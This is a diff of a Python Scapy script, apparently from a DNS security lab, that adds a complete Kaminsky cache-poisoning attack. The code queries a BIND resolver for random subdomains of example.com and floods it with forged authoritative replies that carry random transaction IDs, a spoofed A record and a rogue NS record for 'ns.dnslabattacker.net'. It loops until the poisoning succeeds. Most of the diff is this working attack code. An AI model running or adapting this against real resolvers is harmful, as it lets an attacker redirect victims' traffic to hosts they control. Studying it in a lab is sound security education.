@@ -11,7 +11,6 @@ from subprocess import call
 parser = argparse.ArgumentParser()
 parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
 parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
-parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
 parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
 args = parser.parse_args()
 
@@ -20,9 +19,14 @@ my_ip = args.ip
 # your bind's port (DNS queries are send to this port)
 my_port = args.port
 # BIND's port
-dns_port = args.dns_port
+# dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
+
+# additional parameters.
+domain_name = "example.com"
+addr_to_spoof = '1.2.3.4'
+NS = 'ns.dnslabattacker.net'
 
 '''
 Generates random strings of length 10.
@@ -55,5 +59,53 @@ def exampleSendDNSQuery():
     print response.show()
     print "***** End of Remote Server Packet *****\n"
 
+subdom= getRandomSubDomain() + '.' + domain_name
+def mySendDNSQuery():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname=subdom))
+    sendPacket(sock, dnsPacket, my_ip, my_port)
+
+    return sock
+
+def dnsSpoofer():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    dns = DNS(
+            id = getRandomTXID(),
+            aa = 1,
+            rd = 0,
+            qr = 1,
+            qdcount = 1,
+            ancount = 1,
+            nscount = 2,
+            arcount = 0,
+            qd = DNSQR(qname=subdom),
+            an = DNSRR(rrname=subdom, type='A', rdata=addr_to_spoof, ttl=68900),
+            ns = DNSRR(rrname=b'example.com', type='NS', rdata=NS)
+            )
+   
+    resp = dns
+    resp.getlayer(DNS).qd.qname = subdom
+
+    for r in range(125):
+        resp.getlayer(DNS).id = getRandomTXID()
+        sendPacket(sock, resp, my_ip, my_query_port)
+
+    sock.close()
+    return
+
+def kaminskyAttack():
+    while 1:
+        subdom = getRandomSubDomain() + '.' + domain_name
+        sock = mySendDNSQuery()
+        dnsSpoofer()
+        data, _ = sock.recvfrom(4096)
+        resp = DNS(data)
+        #4096, ttl 68900
+        if resp[DNS].an and resp[DNS].an.rdata == addr_to_spoof:
+            print("kaminsky success")
+            sock.close()
+            break
+
+
 if __name__ == '__main__':
-    exampleSendDNSQuery()
+    kaminskyAttack()
